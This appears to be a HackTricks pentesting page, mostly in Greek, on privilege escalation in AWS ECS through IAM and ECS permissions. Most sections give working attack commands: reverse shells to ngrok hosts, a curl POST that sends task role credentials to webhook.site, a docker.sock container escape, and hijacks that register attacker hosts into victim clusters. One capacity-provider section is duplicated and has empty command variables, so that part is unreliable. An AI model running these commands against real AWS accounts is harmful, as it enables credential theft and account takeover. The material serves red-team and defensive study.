# AWS - ECS Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## ECS

Περισσότερες **πληροφορίες για το ECS** στο:

{{#ref}}
../../aws-services/aws-ecs-enum.md
{{#endref}}

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:RunTask`

Ένας επιτιθέμενος που εκμεταλλεύεται τα δικαιώματα `iam:PassRole`, `ecs:RegisterTaskDefinition` και `ecs:RunTask` στο ECS μπορεί να **δημιουργήσει ένα νέο task definition** με ένα **malicious container** που κλέβει τα metadata credentials και να **το τρέξει**.

{{#tabs }}
{{#tab name="Reverse Shell" }}
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

# Run task definition
aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:eu-west-1:947247140022:cluster/API \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"subnet-e282f9b8\"]}}"

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
{{#endtab }}

{{#tab name="Webhook" }}

Δημιουργήστε ένα webhook με έναν ιστότοπο όπως το webhook.site
```bash

# Create file container-definition.json
[
{
"name": "exfil_creds",
"image": "python:latest",
"entryPoint": ["sh", "-c"],
"command": [
"CREDS=$(curl -s http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}); curl -X POST -H 'Content-Type: application/json' -d \"$CREDS\" https://webhook.site/abcdef12-3456-7890-abcd-ef1234567890"
]
}
]

# Run task definition, uploading the .json file
aws ecs register-task-definition \
--family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 \
--memory 512 \
--requires-compatibilities FARGATE \
--container-definitions file://container-definition.json

# Check the webhook for a response

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1

```
{{#endtab }}

{{#endtabs }}

**Potential Impact:** Άμεσο privesc σε διαφορετικό ECS role.

### `iam:PassRole`,`ecs:RunTask`
Ένας attacker που έχει `iam:PassRole` και `ecs:RunTask` permissions μπορεί να ξεκινήσει ένα νέο ECS task με τροποποιημένες τιμές για **execution role**, **task role** και την **command** του container. Η εντολή CLI `ecs run-task` περιέχει την παράμετρο `--overrides` που επιτρέπει την αλλαγή κατά το runtime των `executionRoleArn`, `taskRoleArn` και της **command** του container χωρίς να τροποποιηθεί το task definition.

Οι καθορισμένοι IAM roles για τα `taskRoleArn` και `executionRoleArn` πρέπει να εμπιστεύονται/επιτρέπουν να αναλαμβάνονται από το `ecs-tasks.amazonaws.com` στην trust policy τους.

Επίσης, ο attacker χρειάζεται να γνωρίζει:
- ECS cluster name
- VPC Subnet
- Security group (εάν δεν καθοριστεί security group θα χρησιμοποιηθεί το default)
- Task Definition Name and revision
- Name of the Container
```bash
aws ecs run-task \
--cluster <cluster-name> \
--launch-type FARGATE \
--network-configuration "awsvpcConfiguration={subnets=[<subnet-id>],securityGroups=[<security-group-id>],assignPublicIp=ENABLED}" \
--task-definition <task-definition:revision> \
--overrides '
{
"taskRoleArn": "arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"containerOverrides": [
{
"name": <container-name>,
"command": ["nc", "4.tcp.eu.ngrok.io", "18798", "-e", "/bin/bash"]
}
]
}'
```
Στο παραπάνω απόσπασμα κώδικα ο attacker αντικαθιστά μόνο την τιμή `taskRoleArn`. Ωστόσο, ο attacker πρέπει να έχει την άδεια `iam:PassRole` για το `taskRoleArn` που προσδιορίζεται στην εντολή και για το `executionRoleArn` που προσδιορίζεται στον ορισμό του task, για να πραγματοποιηθεί το attack.

Εάν ο IAM role που ο attacker μπορεί να περάσει έχει αρκετά προνόμια για να τραβήξει εικόνα από ECR και να ξεκινήσει το ECS task (`ecr:BatchCheckLayerAvailability`, `ecr:GetDownloadUrlForLayer`,`ecr:BatchGetImage`,`ecr:GetAuthorizationToken`) τότε ο attacker μπορεί να ορίσει τον ίδιο IAM role για το `executionRoleArn` και το `taskRoleArn` στην εντολή `ecs run-task`.
```sh
aws ecs run-task --cluster <cluster-name> --launch-type FARGATE --network-configuration "awsvpcConfiguration={subnets=[<subnet-id>],securityGroups=[<security-group-id>],assignPublicIp=ENABLED}" --task-definition <task-definition:revision> --overrides '
{
"taskRoleArn": "arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"executionRoleArn":"arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"containerOverrides": [
{
"name": "<container-name>",
"command": ["nc", "4.tcp.eu.ngrok.io", "18798", "-e", "/bin/bash"]
}
]
}'
```
**Potential Impact:** Άμεση privesc σε οποιοδήποτε ECS task role.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`

Όπως στο προηγούμενο παράδειγμα, ένας attacker που εκμεταλλεύεται τα **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`** δικαιώματα στο ECS μπορεί να **δημιουργήσει ένα νέο task definition** με ένα **κακόβουλο container** που κλέβει τα metadata credentials και να **το τρέξει**.\
Ωστόσο, σε αυτή την περίπτωση απαιτείται ένα container instance για να τρέξει το κακόβουλο task definition.
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

aws ecs start-task --task-definition iam_exfiltration \
--container-instances <instance_id>

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
**Πιθανός αντίκτυπος:** Άμεσο privesc σε οποιοδήποτε ECS role.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, (`ecs:UpdateService|ecs:CreateService)` 

Όπως στο προηγούμενο παράδειγμα, ένας επιτιθέμενος που καταχράται τα δικαιώματα **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:UpdateService`** ή **`ecs:CreateService`** στο ECS μπορεί να **generate a new task definition** με ένα **malicious container** που κλέβει τα **metadata credentials** και να το **run** δημιουργώντας ένα νέο **service** με τουλάχιστον 1 **task** σε εκτέλεση.
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn  "$ECS_ROLE_ARN" \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/8.tcp.ngrok.io/12378 0>&1\\\"\"]}]"

# Run the task creating a service
aws ecs create-service --service-name exfiltration \
--task-definition iam_exfiltration \
--desired-count 1 \
--cluster "$CLUSTER_ARN" \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"$SUBNET\"]}}"

# Run the task updating a service
aws ecs update-service --cluster <CLUSTER NAME> \
--service <SERVICE NAME> \
--task-definition <NEW TASK DEFINITION NAME>
```
**Potential Impact:** Άμεσο privesc σε οποιονδήποτε ρόλο ECS.

### `iam:PassRole`, (`ecs:UpdateService|ecs:CreateService)`

Στην πραγματικότητα, μόνο με αυτά τα δικαιώματα είναι δυνατό να χρησιμοποιηθούν overrides για να εκτελεστούν αυθαίρετες εντολές σε ένα container με έναν αυθαίρετο ρόλο με κάτι σαν:
```bash
aws ecs run-task \
--task-definition "<task-name>" \
--overrides '{"taskRoleArn":"<role-arn>", "containerOverrides":[{"name":"<container-name-in-task>","command":["/bin/bash","-c","curl https://reverse-shell.sh/6.tcp.eu.ngrok.io:18499 | sh"]}]}' \
--cluster <cluster-name> \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"DISABLED\", \"subnets\":[\"<subnet-name>\"]}}"
```
**Πιθανός αντίκτυπος:** Direct privesc to any ECS role.

### `ecs:RegisterTaskDefinition`, **`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

Αυτό το σενάριο είναι όπως τα προηγούμενα αλλά **χωρίς** την **`iam:PassRole`** άδεια.\
Αυτό παραμένει ενδιαφέρον γιατί αν μπορείτε να τρέξετε έναν arbitrary container, ακόμη κι αν είναι χωρίς role, θα μπορούσατε να **τρέξετε έναν privileged container για escape** στο node και να **κλέψετε το EC2 IAM role** και τα **roles των άλλων ECS containers** που τρέχουν στο node.\
Μπορείτε ακόμη και να **αναγκάσετε άλλες εργασίες να τρέξουν μέσα στο EC2 instance** που παραβιάζετε για να κλέψετε τα credentials τους (όπως συζητείται στην [**Privesc to node section**](aws-ecs-post-exploitation/README.md#privesc-to-node)).

> [!WARNING]
> Αυτή η επίθεση είναι δυνατή μόνο εάν το **ECS cluster is using EC2** instances και όχι Fargate.
```bash
printf '[
{
"name":"exfil_creds",
"image":"python:latest",
"entryPoint":["sh", "-c"],
"command":["/bin/bash -c \\\"bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/12976 0>&1\\\""],
"mountPoints": [
{
"readOnly": false,
"containerPath": "/var/run/docker.sock",
"sourceVolume": "docker-socket"
}
]
}
]' > /tmp/task.json

printf '[
{
"name": "docker-socket",
"host": {
"sourcePath": "/var/run/docker.sock"
}
}
]' > /tmp/volumes.json


aws ecs register-task-definition --family iam_exfiltration \
--cpu 256 --memory 512 \
--requires-compatibilities '["EC2"]' \
--container-definitions file:///tmp/task.json \
--volumes file:///tmp/volumes.json


aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:us-east-1:947247140022:cluster/ecs-takeover-ecs_takeover_cgidc6fgpq6rpg-cluster \
--launch-type EC2

# You will need to do 'apt update' and 'apt install docker.io' to install docker in the rev shell
```
### `ecs:ExecuteCommand`, `ecs:DescribeTasks,`**`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

Ένας επιτιθέμενος με τα **`ecs:ExecuteCommand`, `ecs:DescribeTasks`** μπορεί να **execute commands** μέσα σε ένα running container και να exfiltrate το IAM role που του είναι επισυναπτόμενο (χρειάζεστε τα describe permissions γιατί είναι απαραίτητα για να τρέξετε `aws ecs execute-command`).\
Ωστόσο, για να γίνει αυτό, η container instance πρέπει να τρέχει τον **ExecuteCommand agent** (ο οποίος εξ ορισμού δεν τρέχει).

Συνεπώς, ο επιτιθέμενος μπορεί να προσπαθήσει να:

- **Try to run a command** σε κάθε container που τρέχει
```bash
# List enableExecuteCommand on each task
for cluster in $(aws ecs list-clusters | jq .clusterArns | grep '"' | cut -d '"' -f2); do
echo "Cluster $cluster"
for task in $(aws ecs list-tasks --cluster "$cluster" | jq .taskArns | grep '"' | cut -d '"' -f2); do
echo "  Task $task"
# If true, it's your lucky day
aws ecs describe-tasks --cluster "$cluster" --tasks "$task" | grep enableExecuteCommand
done
done

# Execute a shell in a container
aws ecs execute-command --interactive \
--command "sh" \
--cluster "$CLUSTER_ARN" \
--task "$TASK_ARN"
```
Μόλις έχετε ένα shell μέσα στο container, μπορείτε συνήθως να **εξάγετε τα task role credentials** από το task credentials endpoint και να τα ξαναχρησιμοποιήσετε έξω από το container:
```sh
# Inside the container:
echo "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" | jq

# If you want to use them locally, print shell exports:
python3 - <<'PY'
import json, os, urllib.request
u = "http://169.254.170.2" + os.environ["AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"]
d = json.load(urllib.request.urlopen(u, timeout=2))
print("export AWS_ACCESS_KEY_ID=" + d["AccessKeyId"])
print("export AWS_SECRET_ACCESS_KEY=" + d["SecretAccessKey"])
print("export AWS_SESSION_TOKEN=" + d["Token"])
PY
```
- If he has **`ecs:RunTask`**, run a task with `aws ecs run-task --enable-execute-command [...]`
- If he has **`ecs:StartTask`**, run a task with `aws ecs start-task --enable-execute-command [...]`
- If he has **`ecs:CreateService`**, create a service with `aws ecs create-service --enable-execute-command [...]`
- If he has **`ecs:UpdateService`**, update a service with `aws ecs update-service --enable-execute-command [...]`

You can find **examples of those options** in **previous ECS privesc sections**.

**Potential Impact:** Privesc to a different role attached to containers.

### `ssm:StartSession`

Δείτε στη σελίδα **ssm privesc** πώς μπορείτε να καταχραστείτε αυτό το permission για να **privesc σε ECS**:

{{#ref}}
../aws-ssm-privesc/README.md
{{#endref}}

### `iam:PassRole`, `ec2:RunInstances`

Δείτε στη σελίδα **ec2 privesc** πώς μπορείτε να καταχραστείτε αυτά τα permissions για να **privesc σε ECS**:

{{#ref}}
../aws-ec2-privesc/README.md
{{#endref}}

### `ecs:RegisterContainerInstance`, `ecs:DeregisterContainerInstance`, `ecs:StartTask`, `iam:PassRole`

Ένας attacker με αυτά τα permissions μπορεί συχνά να **μετατρέψει το "cluster membership" σε security boundary bypass**:

- Register an **attacker-controlled EC2 instance** into a victim ECS cluster (becoming a container instance)
- Set custom **container instance attributes** to satisfy **placement constraints**
- Let ECS schedule tasks onto that host
- Steal **task role credentials** (and any secrets/data inside the container) from the task running on your host

High-level workflow:

1) Obtain an EC2 instance identity document + signature from an EC2 instance you control in the target account (for example via SSM/SSH):
```bash
curl -s http://169.254.169.254/latest/dynamic/instance-identity/document > iidoc.json
curl -s http://169.254.169.254/latest/dynamic/instance-identity/signature > iisig
```
2) Καταχώρησέ το στο target cluster, προαιρετικά ορίζοντας attributes για να ικανοποιηθούν οι placement constraints:
```bash
aws ecs register-container-instance \
--cluster "$CLUSTER" \
--instance-identity-document file://iidoc.json \
--instance-identity-document-signature "$(cat iisig)" \
--attributes name=labtarget,value=hijack
```
3) Επιβεβαιώστε ότι εντάχθηκε:
```bash
aws ecs list-container-instances --cluster "$CLUSTER"
```
4) Ξεκινήστε ένα task / ενημερώστε μια service ώστε κάτι να προγραμματιστεί στο instance, και στη συνέχεια harvest task role creds από μέσα στο task:
```bash
# On the container host:
docker ps
docker exec -it <container-id> sh
curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
```
Notes:

- Η καταχώριση ενός container instance χρησιμοποιώντας το instance identity document/signature συνεπάγεται ότι έχετε πρόσβαση σε ένα EC2 instance στον λογαριασμό-στόχο (ή έχετε παραβιάσει ένα). Για cross-account "bring your own EC2", δείτε την τεχνική **ECS Anywhere** σε αυτή τη σελίδα.
- Οι placement constraints συνήθως βασίζονται σε container instance attributes. Καταγράψτε τα μέσω `ecs:DescribeServices`, `ecs:DescribeTaskDefinition`, και `ecs:DescribeContainerInstances` για να ξέρετε ποια attributes πρέπει να ορίσετε.


### `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, `ecs:DescribeTaskSets`

> [!NOTE]
> TODO: Δοκιμάστε αυτό

Ένας attacker με τα permissions `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, και `ecs:DescribeTaskSets` μπορεί να **δημιουργήσει ένα malicious task set για μια υπάρχουσα υπηρεσία ECS και να ενημερώσει το primary task set**. Αυτό επιτρέπει στον attacker να **εκτελέσει αυθαίρετο κώδικα εντός της υπηρεσίας**.
```bash
# Register a task definition with a reverse shell
echo '{
"family": "malicious-task",
"containerDefinitions": [
{
"name": "malicious-container",
"image": "alpine",
"command": [
"sh",
"-c",
"apk add --update curl && curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | sh"
]
}
]
}' > malicious-task-definition.json

aws ecs register-task-definition --cli-input-json file://malicious-task-definition.json

# Create a malicious task set for the existing service
aws ecs create-task-set --cluster existing-cluster --service existing-service --task-definition malicious-task --network-configuration "awsvpcConfiguration={subnets=[subnet-0e2b3f6c],securityGroups=[sg-0f9a6a76],assignPublicIp=ENABLED}"

# Update the primary task set for the service
aws ecs update-service-primary-task-set --cluster existing-cluster --service existing-service --primary-task-set arn:aws:ecs:region:123456789012:task-set/existing-cluster/existing-service/malicious-task-set-id
```
**Potential Impact**: Εκτέλεση αυθαίρετου κώδικα στην επηρεαζόμενη υπηρεσία, ενδεχομένως επηρεάζοντας τη λειτουργικότητά της ή εξάγοντας ευαίσθητα δεδομένα.

## References

- [https://ruse.tech/blogs/ecs-attack-methods](https://ruse.tech/blogs/ecs-attack-methods)







### Hijack ECS Scheduling via Malicious Capacity Provider (EC2 ASG takeover)

Ένας επιτιθέμενος με δικαιώματα για διαχείριση των ECS capacity providers και ενημέρωση υπηρεσιών μπορεί να δημιουργήσει ένα EC2 Auto Scaling Group που ελέγχει, να το τυλίξει σε έναν ECS Capacity Provider, να το συσχετίσει με το στοχευμένο cluster και να μετακινήσει μια υπηρεσία θύματος ώστε να χρησιμοποιεί αυτόν τον provider. Οι tasks θα προγραμματίζονται σε EC2 instances ελεγχόμενα από τον επιτιθέμενο, επιτρέποντας πρόσβαση σε επίπεδο OS για επιθεώρηση των containers και κλοπή των διαπιστευτηρίων task role.

Commands (us-east-1):

- Προαπαιτούμενα



- Create Launch Template for ECS agent to join target cluster



- Create Auto Scaling Group



- Create Capacity Provider from the ASG



- Associate the Capacity Provider to the cluster (optionally as default)



- Migrate a service to your provider



- Verify tasks land on attacker instances



- Optional: From the EC2 node, docker exec into target containers and read http://169.254.170.2 to obtain the task role credentials.

- Cleanup



**Potential Impact:** Attacker-controlled EC2 nodes receive victim tasks, enabling OS-level access to containers and theft of task IAM role credentials.


<details>
<summary>Step-by-step commands (copy/paste)</summary>
<pre>
export AWS_DEFAULT_REGION=us-east-1
CLUSTER=arn:aws:ecs:us-east-1:947247140022:cluster/ht-victim-cluster
# Instance profile for ECS nodes
aws iam create-role --role-name ht-ecs-instance-role --assume-role-policy-document Version:2012-10-17 || true
aws iam attach-role-policy --role-name ht-ecs-instance-role --policy-arn arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role || true
aws iam create-instance-profile --instance-profile-name ht-ecs-instance-profile || true
aws iam add-role-to-instance-profile --instance-profile-name ht-ecs-instance-profile --role-name ht-ecs-instance-role || true

VPC=vpc-18e6ac62
SUBNETS=

AMI=ami-0b570770164588ab4
USERDATA=IyEvYmluL2Jhc2gKZWNobyBFQ1NfQ0xVU1RFUj0gPj4gL2V0Yy9lY3MvZWNzLmNvbmZpZwo=
LT_ID=

ASG_ARN=

CP_NAME=htcp-8797
aws ecs create-capacity-provider --name  --auto-scaling-group-provider "autoScalingGroupArn=,managedScaling={status=ENABLED,targetCapacity=100},managedTerminationProtection=DISABLED"
aws ecs put-cluster-capacity-providers --cluster "" --capacity-providers  --default-capacity-provider-strategy capacityProvider=,weight=1

SVC=
# Task definition must be EC2-compatible (not Fargate-only)
aws ecs update-service --cluster "" --service "" --capacity-provider-strategy capacityProvider=,weight=1 --force-new-deployment

TASK=
CI=
aws ecs describe-container-instances --cluster "" --container-instances "" --query containerInstances[0].ec2InstanceId --output text
</pre>
</details>

### Backdoor compute in-cluster via ECS Anywhere EXTERNAL registration

Κατάχρηση του ECS Anywhere για να εγγράψετε έναν host που ελέγχεται από τον επιτιθέμενο ως EXTERNAL container instance σε ένα θύμα ECS cluster και να εκτελέσετε tasks σε αυτόν τον host χρησιμοποιώντας privileged task και execution roles. Αυτό δίνει έλεγχο σε επίπεδο OS πάνω στο πού εκτελούνται οι tasks (τη δική σας μηχανή) και επιτρέπει κλοπή διαπιστευτηρίων/δεδομένων από tasks και προσαρτημένους όγκους χωρίς να πειράξετε capacity providers ή ASGs.

- Απαιτούμενα δικαιώματα (παράδειγμα ελάχιστα):
- ecs:CreateCluster (optional), ecs:RegisterTaskDefinition, ecs:StartTask or ecs:RunTask
- ssm:CreateActivation, ssm:DeregisterManagedInstance, ssm:DeleteActivation
- iam:CreateRole, iam:AttachRolePolicy, iam:DeleteRole, iam:PassRole (για το ECS Anywhere instance role και τα task/execution roles)
- logs:CreateLogGroup/Stream, logs:PutLogEvents (εάν χρησιμοποιείται awslogs)

- Επίπτωση: Εκτέλεση αυθαίρετων containers με επιλεγμένο taskRoleArn στον host του επιτιθέμενου; εξαγωγή διαπιστευτηρίων task-role από 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI; πρόσβαση σε οποιαδήποτε volumes προσαρτημένα από tasks; πιο διακριτική μέθοδος σε σχέση με τη χειραγώγηση capacity providers/ASGs.

Βήματα

1) Δημιουργήστε/εντοπίστε το cluster (us-east-1)
```bash
aws ecs create-cluster --cluster-name ht-ecs-anywhere
```
2) Δημιουργήστε ρόλο ECS Anywhere και ενεργοποιήστε SSM (για on-prem/EXTERNAL instance)
```bash
aws iam create-role --role-name ecsAnywhereRole \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ssm.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
aws iam attach-role-policy --role-name ecsAnywhereRole --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore
aws iam attach-role-policy --role-name ecsAnywhereRole --policy-arn arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role
ACTJSON=$(aws ssm create-activation --iam-role ecsAnywhereRole)
ACT_ID=$(echo $ACTJSON | jq -r .ActivationId); ACT_CODE=$(echo $ACTJSON | jq -r .ActivationCode)
```
3) Προετοιμάστε host επιτιθέμενου και καταχωρήστε το αυτόματα ως EXTERNAL (παράδειγμα: μικρό AL2 EC2 ως “on‑prem”)

<details>
<summary>user-data.sh</summary>
```bash
#!/bin/bash
set -euxo pipefail
amazon-linux-extras enable docker || true
yum install -y docker curl jq
systemctl enable --now docker
curl -fsSL -o /root/ecs-anywhere-install.sh "https://amazon-ecs-agent.s3.amazonaws.com/ecs-anywhere-install-latest.sh"
chmod +x /root/ecs-anywhere-install.sh
/root/ecs-anywhere-install.sh --cluster ht-ecs-anywhere --activation-id ${ACT_ID} --activation-code ${ACT_CODE} --region us-east-1
```
</details>
```bash
AMI=$(aws ssm get-parameters --names /aws/service/ami-amazon-linux-latest/amzn2-ami-hvm-x86_64-gp2 --query 'Parameters[0].Value' --output text)
IID=$(aws ec2 run-instances --image-id $AMI --instance-type t3.micro \
--user-data file://user-data.sh --query 'Instances[0].InstanceId' --output text)
aws ec2 wait instance-status-ok --instance-ids $IID
```
4) Επιβεβαιώστε ότι η EXTERNAL container instance εντάχθηκε
```bash
aws ecs list-container-instances --cluster ht-ecs-anywhere
aws ecs describe-container-instances --cluster ht-ecs-anywhere \
--container-instances <ci-arn> --query 'containerInstances[0].[ec2InstanceId,attributes]'
# ec2InstanceId will be mi-XXXXXXXX (SSM managed instance id) and attributes include ecs.capability.external
```
5) Δημιουργήστε task/execution roles, εγγράψτε EXTERNAL task definition, και τρέξτε το στον attacker host
```bash
# roles
aws iam create-role --role-name ht-ecs-task-exec \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ecs-tasks.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
aws iam attach-role-policy --role-name ht-ecs-task-exec --policy-arn arn:aws:iam::aws:policy/service-role/AmazonECSTaskExecutionRolePolicy
aws iam create-role --role-name ht-ecs-task-role \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ecs-tasks.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
# attach any privileges you want to abuse to this task role

# task def (EXTERNAL launch)
cat > td-external.json << 'JSON'
{
"family": "ht-external",
"requiresCompatibilities": [ "EXTERNAL" ],
"networkMode": "bridge",
"memory": "256",
"cpu": "128",
"executionRoleArn": "arn:aws:iam::<account-id>:role/ht-ecs-task-exec",
"taskRoleArn": "arn:aws:iam::<account-id>:role/ht-ecs-task-role",
"containerDefinitions": [
{"name":"steal","image":"public.ecr.aws/amazonlinux/amazonlinux:latest",
"entryPoint":["/bin/sh","-c"],
"command":["REL=\$(printenv AWS_CONTAINER_CREDENTIALS_RELATIVE_URI); echo CREDS:; curl -s http://169.254.170.2\$REL; sleep 600"],
"memory": 128,
"logConfiguration":{"logDriver":"awslogs","options":{"awslogs-region":"us-east-1","awslogs-group":"/ht/ecs/anywhere","awslogs-stream-prefix":"steal"}}
}
]
}
JSON
aws logs create-log-group --log-group-name /ht/ecs/anywhere || true
aws ecs register-task-definition --cli-input-json file://td-external.json
CI=$(aws ecs list-container-instances --cluster ht-ecs-anywhere --query 'containerInstanceArns[0]' --output text)
aws ecs start-task --cluster ht-ecs-anywhere --task-definition ht-external \
--container-instances $CI
```
6) Από εδώ έχετε τον έλεγχο του host που τρέχει τα tasks. Μπορείτε να διαβάσετε τα task logs (αν awslogs) ή να κάνετε exec απευθείας στον host για να εξαγάγετε credentials/δεδομένα από τα tasks σας.



#### Παράδειγμα εντολής (placeholders)




### Hijack ECS Scheduling via Malicious Capacity Provider (EC2 ASG takeover)

An attacker with permissions to manage ECS capacity providers and update services can create an EC2 Auto Scaling Group they control, wrap it in an ECS Capacity Provider, associate it to the target cluster, and migrate a victim service to use this provider. Tasks will then be scheduled onto attacker-controlled EC2 instances, allowing OS-level access to inspect containers and steal task role credentials.

Commands (us-east-1):

- Προαπαιτούμενα



- Δημιουργία Launch Template για τον ECS agent ώστε να ενταχθεί στο target cluster



- Δημιουργία Auto Scaling Group



- Δημιουργία Capacity Provider από το ASG



- Συσχέτιση του Capacity Provider με το cluster (προαιρετικά ως default)



- Μεταφορά μιας service στο provider σας



- Επαλήθευση ότι τα tasks προσγειώνονται σε attacker instances



- Προαιρετικά: Από το EC2 node, κάντε docker exec στα target containers και διαβάστε http://169.254.170.2 για να αποκτήσετε τα task role credentials.

- Καθαρισμός



**Potential Impact:** Attacker-controlled EC2 nodes λαμβάνουν victim tasks, επιτρέποντας OS-level πρόσβαση σε containers και κλοπή των task IAM role credentials.
{{#include ../../../../banners/hacktricks-training.md}}
